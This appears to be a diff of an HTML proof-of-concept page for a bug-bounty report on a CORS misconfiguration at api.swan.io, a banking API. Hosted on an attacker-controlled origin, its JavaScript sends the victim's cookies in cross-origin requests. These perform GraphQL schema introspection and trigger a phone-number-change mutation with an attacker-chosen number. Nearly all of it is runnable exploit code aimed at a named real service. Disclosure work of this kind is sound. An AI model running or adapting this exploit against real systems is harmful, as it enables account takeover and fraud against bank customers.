@@ -1,63 +1,113 @@
-<!--  index.html  (must be served from https://evil.com/)  -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<title>Swan CORS Critical PoC</title>
+<meta charset="UTF-8">
+<title>Critical CORS Misconfiguration PoC</title>
 <style>
- body {font-family:sans-serif;max-width:900px;margin:2rem auto}
- pre  {background:#f6f8fa;border:1px solid #ddd;padding:0.75rem;overflow:auto}
- .ok  {color:#070}.err{color:#c00}
+    body{font-family:system-ui, sans-serif;max-width:60rem;margin:2rem auto;padding:0 1rem;line-height:1.5}
+    pre{background:#f4f4f4;padding:.75rem .9rem;border:1px solid #ddd;overflow:auto}
+    code{font-family:ui-monospace, monospace}
+    button{padding:.6rem 1rem;font-size:1rem}
+    #result{white-space:pre-wrap}
 </style>
 </head>
 <body>
-<h1>Swan Banking &ndash; Critical CORS Misconfiguration PoC</h1>
 
-<p>This page is hosted on <code>https://evil.com</code>.  
-If the browser already holds valid <code>api.swan.io</code> cookies, the two
-cross-origin requests below will succeed <strong>without</strong> any
-<code>X-Swan-Authenticator-Token</code> or JWT.</p>
+<h1>Critical CORS Misconfiguration PoC</h1>
 
-<h2>1. Schema introspection (unauthenticated)</h2>
-<pre id="introspect">…waiting…</pre>
+<p>
+This page is <strong>served from <code>snowgoose.info</code></strong> (an attacker-controlled origin).  
+If the browser already holds <code>api.swan.io</code> cookies, clicking the button below will:
+</p>
 
-<h2>2. startPhoneNumberModification (unauthenticated)</h2>
-<pre id="startmod">…waiting…</pre>
+<ol>
+  <li>Perform an unauthenticated, cross-origin <em>schema introspection</em> request to <code>/admin/graphql</code>.</li>
+  <li>Queue an unauthenticated <em>startPhoneNumberModification</em> mutation against
+      <code>/admin-auth/graphql</code> using a phone number chosen by the attacker.</li>
+</ol>
+
+<p>
+Because <code>api.swan.io</code> returns <code>Access-Control-Allow-Origin: https://snowgoose.info</code> and
+<code>Access-Control-Allow-Credentials: true</code>, the victim’s
+<code>api.swan.io</code> cookies are sent automatically – <em>no JWT or custom header is required</em>.
+</p>
+
+<button id="run">Run exploit</button>
+
+<h2>Raw responses</h2>
+<pre id="result">Click “Run exploit” …</pre>
 
 <script>
-async function swanFetch(query, target){
-  const res = await fetch(target, {
-    method: "POST",
-    credentials: "include",              // <-- sends victim’s cookies
-    headers: {"Content-Type":"application/json"},
-    body: JSON.stringify({query})
-  });
-  return {status: res.status, body: await res.text()};
-}
+(function () {
 
-(async ()=>{
-  /* 1) unauthenticated schema introspection */
-  const q1 = `{ __schema { queryType { name } } }`;
-  const r1 = await swanFetch(q1, "https://api.swan.io/admin/graphql");
-  document.getElementById("introspect").textContent =
-    "HTTP " + r1.status + "\n" + r1.body;
+    const ADMIN_URL  = 'https://api.swan.io/admin/graphql';
+    const AUTH_URL   = 'https://api.swan.io/admin-auth/graphql';
+    const headers    = { 'Content-Type': 'application/json' ,
+                         'User-Agent'  : 'Mozilla/5.0 -BugBounty-swan' };
 
-  /* 2) unauthenticated sensitive mutation */
-  const q2 = `mutation {
-    startPhoneNumberModification(input:{
-      oldPhoneNumber:"+33600000000",
-      newPhoneNumber:"+33612345666"
-    }){
-      __typename
-      ... on StartPhoneNumberModificationSuccessPayload {
-        phoneNumberModification { id }
-      }
+    const print = msg => document.getElementById('result').textContent += msg + '\n';
+
+    // Generate a fresh French mobile to avoid “…AlreadyExistsRejection”
+    function randomMobile () {
+        return '+336' + Math.floor(1e7 + Math.random() * 9e7);
     }
-  }`;
-  const r2 = await swanFetch(q2, "https://api.swan.io/admin-auth/graphql");
-  document.getElementById("startmod").textContent =
-    "HTTP " + r2.status + "\n" + r2.body;
+
+    async function runPoC () {
+
+        document.getElementById('result').textContent = '';   // clear previous run
+        const newPhone = randomMobile();
+
+        /* 1. Unauthenticated schema introspection */
+        const introspection = `
+        { __schema { queryType { name } } }`;
+
+        let r1 = await fetch(ADMIN_URL, {
+            method : 'POST',
+            mode   : 'cors',
+            credentials : 'include',      // send victim cookies
+            headers,
+            body   : JSON.stringify({ query:introspection })
+        });
+
+        print('=== /admin/graphql (schema introspection) ===');
+        print('HTTP ' + r1.status);
+        print(await r1.text());
+
+        /* 2. Unauthenticated startPhoneNumberModification */
+        const mutation = `
+        mutation {
+          startPhoneNumberModification(input:{
+              oldPhoneNumber:"+33600000001",
+              newPhoneNumber:"${newPhone}"
+          }) {
+            __typename
+            ... on StartPhoneNumberModificationSuccessPayload {
+              phoneNumberModification { id }
+            }
+            ... on PhoneNumberModificationAlreadyExistsRejection {
+              message
+            }
+          }
+        }`;
+
+        let r2 = await fetch(AUTH_URL, {
+            method : 'POST',
+            mode   : 'cors',
+            credentials : 'include',
+            headers,
+            body   : JSON.stringify({ query:mutation })
+        });
+
+        print('\n=== /admin-auth/graphql (startPhoneNumberModification) ===');
+        print('HTTP ' + r2.status);
+        print(await r2.text());
+
+        print('\n[+] New phone used: ' + newPhone);
+    }
+
+    document.getElementById('run').addEventListener('click', runPoC);
 })();
 </script>
+
 </body>
 </html>
